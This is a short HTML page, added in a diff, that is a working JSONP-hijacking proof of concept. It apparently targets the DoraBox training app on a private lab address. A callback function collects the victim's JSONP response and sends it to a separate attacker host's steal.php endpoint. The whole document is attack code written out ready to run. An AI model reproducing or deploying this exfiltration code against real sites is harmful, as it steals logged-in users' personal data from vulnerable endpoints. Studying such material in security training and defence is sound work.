@@ -1,0 +1,47 @@
+<html>
+
+<head>
+
+<title>jsonp劫持</title>
+
+<meta charset="utf-8">
+
+</head>
+
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+<script>
+
+function jsonp_hack(v){
+
+//alert("jsonp劫持");
+
+var h='';
+
+for(var key in v){
+
+var a=''
+
+a=key+' : '+v[key]+' ,'   // 结尾多写了一个逗号
+
+h+=a
+
+}
+
+//alert(h);
+
+$.get('http://192.168.0.103:808/steal.php?data='+h);
+
+}
+
+</script>
+
+<script src="http://192.168.255.151:8081/DoraBox-master/csrf/jsonp.php?callback=jsonp_hack"></script>
+
+<body>
+
+<h1>jsonp劫持</h1>
+
+</body>
+
+</html>
